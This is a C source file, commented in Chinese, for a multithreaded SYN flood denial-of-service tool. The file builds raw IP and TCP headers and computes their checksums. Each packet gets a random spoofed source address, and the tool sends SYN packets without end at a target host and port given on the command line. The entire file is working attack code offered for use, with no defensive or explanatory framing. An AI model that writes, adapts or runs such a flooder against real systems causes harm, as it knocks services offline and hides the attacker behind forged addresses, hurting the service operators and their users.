// syn.c
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <arpa/inet.h>

/* 最大线程数 */
#define MAXCHILD 4

/* 原始套接字 */
int sockfd;

/* 程序活动标志 */
static int alive = -1;

/* 初始化声明目标IP和端口号 */
static int dst_port;
char dst_ip[20] = {0};

struct ip{
	unsigned char       hl; // 版本号与IP头部长度
	unsigned char       tos;// 服务类型
	unsigned short      total_len;
	unsigned short      id;
	unsigned short      frag_and_flags;
	unsigned char       ttl;
	unsigned char       proto;
	unsigned short      checksum;
	unsigned int        sourceIP;
	unsigned int        destIP;
};
	
struct tcphdr{
	unsigned short      sport;
	unsigned short      dport;
	unsigned int        seq;
	unsigned int        ack;
	unsigned char       lenres;
	unsigned char       flag;
	unsigned short      win;
	unsigned short      sum;
	unsigned short      urp;
};

struct pseudohdr{
	unsigned int	    saddr;
	unsigned int 	    daddr;
	char                zero;
	char                protocol;
	unsigned short      length;
};

/* 计算校验和 */
unsigned short checksum (unsigned short *buffer, unsigned short size){  

	unsigned long cksum = 0;
	
	while(size>1){
		cksum += *buffer++;
		size  -= sizeof(unsigned short);
	}
	
	if(size){
		cksum += *(unsigned char *)buffer;
	}
	
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);		
	
	return((unsigned short )(~cksum));
}

/* 发SYN包
 * 填写IP头部，TCP头部,TCP伪头部仅用于校验和的计算
 */
void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader){
	int len = sizeof(struct ip) + sizeof(struct tcphdr);
	
	// IP头部数据初始化
	ip->hl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
	ip->tos = 0;
	ip->total_len = htons(len);
	ip->id = 1;
	ip->frag_and_flags = 0x40;
	ip->ttl = 255;
	ip->proto = IPPROTO_TCP;
	ip->checksum = 0;
	ip->sourceIP = 0;
	ip->destIP = inet_addr(dst_ip);

	// TCP头部数据初始化
	tcp->sport = htons(8888);
	tcp->dport = htons(dst_port);
	tcp->seq = htonl(0); 
	tcp->ack = 0; 
	tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
	tcp->flag = 0x02; //设置flag值的大小，00000
	tcp->win = htons (2048);  
	tcp->sum = 0;
	tcp->urp = 0;

	//TCP伪头部
	pseudoheader->zero = 0;
	pseudoheader->protocol = IPPROTO_TCP;
	pseudoheader->length = htons(sizeof(struct tcphdr));
	pseudoheader->daddr = inet_addr(dst_ip);
}


/* 发送SYN包函数
 * 填写IP头部，TCP头部,TCP伪头部仅用于校验和的计算
 */
void send_synflood(struct sockaddr_in *addr){ 
	char buf[100], sendbuf[100];
	int len;
	struct ip ip;			//IP头部
	struct tcphdr tcp;		//TCP头部
	struct pseudohdr pseudoheader;	//TCP伪头部


	len = sizeof(struct ip) + sizeof(struct tcphdr);
	
	/* 初始化头部信息 */
	init_header(&ip, &tcp, &pseudoheader);
	
	/* 处于活动状态时持续发送SYN包 */
	while(alive){
		ip.sourceIP = rand();

		//计算IP校验和
		bzero(buf, sizeof(buf));
		memcpy(buf , &ip, sizeof(struct ip));
		ip.checksum = checksum((u_short *) buf, sizeof(struct ip));

		pseudoheader.saddr = ip.sourceIP;

		//计算TCP校验和
		bzero(buf, sizeof(buf));
		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
		memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
		tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));

		bzero(sendbuf, sizeof(sendbuf));
		memcpy(sendbuf, &ip, sizeof(struct ip));
		memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));
		
		printf("%d:%d -attack-> %d:%d syn flooding\n",ip.sourceIP,tcp.sport,ip.destIP,dst_port);
		
		if(0 > sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))){
			perror("sendto Error!\n");
			pthread_exit("fail");
		}
	}
}

/* 信号处理函数,设置退出变量alive */
void sig_int(int signo){
	alive = 0;
}

int main(int argc, char *argv[]){
	struct sockaddr_in addr;
	struct hostent *host = NULL;

	int on = 1;
	int i = 0;

	int err = -1;
	
	pthread_t pthread[MAXCHILD];

	srand((int)time(NULL));

	alive = 1;
	
	/* 截取信号CTRL+C */
	signal(SIGINT, sig_int);

	/* 参数是否数量正确 */
	if(argc!=3){
		printf("usage: syn <target ip> <target port>\n");
		exit(1);
	}

	strncpy(dst_ip, argv[1], 16);
	dst_port = atoi(argv[2]);

	bzero(&addr, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);

	if(inet_addr(dst_ip) == INADDR_NONE){
		
		/* 若为DNS地址，查询并转换成IP地址 */
		host = gethostbyname(argv[1]);
		if(host == NULL){
			perror("gethostbyname Error!\n");
			exit(1);
		}
		addr.sin_addr = *((struct in_addr*)(host->h_addr));
		strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
	}else
		addr.sin_addr.s_addr = inet_addr(dst_ip);


	/* 验证端口是否有效 */
	if(dst_port < 0 || dst_port > 65535){
		printf("port is out of range!\n");
		exit(1);
	}

	/* 建立原始socket */
	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);	
	if(sockfd < 0){
		perror("socket Error!\n");
		exit(1);
	}
	
	/* 设置IP选项 */
	if(0>setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on))){
		perror("setsockopt Error!\n");
		exit(1);
	}

	/* 建立多个线程 */
	for(i=0; i<MAXCHILD; i++){
		err = pthread_create(&pthread[i], NULL, send_synflood, &addr);
		if(err!=0){
			perror("pthread_create Error!\n");
			exit(1);
		}
	}

	/* 等待线程结束 */
	for(i=0; i<MAXCHILD; i++){
		err = pthread_join(pthread[i], NULL);
		if(err!=0){
			perror("pthread_join Error\n");
			exit(1);
		}
	}

	close(sockfd);

	return 0;
}
